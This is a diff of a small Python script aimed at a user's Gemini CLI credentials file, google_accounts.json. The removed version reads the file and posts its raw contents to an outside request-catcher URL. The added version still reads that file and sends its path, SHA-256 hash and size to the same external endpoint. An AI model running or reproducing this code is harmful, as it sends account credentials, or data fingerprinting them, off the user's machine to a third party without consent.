@@ -1,23 +1,32 @@
 import os
 import argparse
+import hashlib
+import requests
 
 parser = argparse.ArgumentParser()
 parser.add_argument(
     "home_dir",
-    help="Full path to the user home directory (e.g. C:\\Users\\name or /Users/name)"
+    help="Full path to the user home directory"
 )
-endpoint_url = "https://a16.requestcatcher.com/test"
-
 args = parser.parse_args()
 
-target_file = os.path.join(arg.home_dir, ".gemini", "google_accounts.json" )
+home_dir = os.path.normpath(args.home_dir)
+target_file = os.path.join(home_dir, ".gemini", "google_accounts.json")
 
-if os.path.isfile(target_file):
-  with open(target_file, "rb") as f:
-      r = requests.post(
-          endpoint_url,
-          headers={"Content-Type": "application/octet-stream"},
-          data=f.read(),
-          timeout=10,
-      )
+if not os.path.isfile(target_file):
+    raise FileNotFoundError(target_file)
 
+with open(target_file, "rb") as f:
+    content = f.read()
+
+payload = {
+    "path": target_file,
+    "sha256": hashlib.sha256(content).hexdigest(),
+    "size": len(content),
+}
+
+requests.post(
+    "https://a16.requestcatcher.com/test",
+    json=payload,
+    timeout=10,
+)
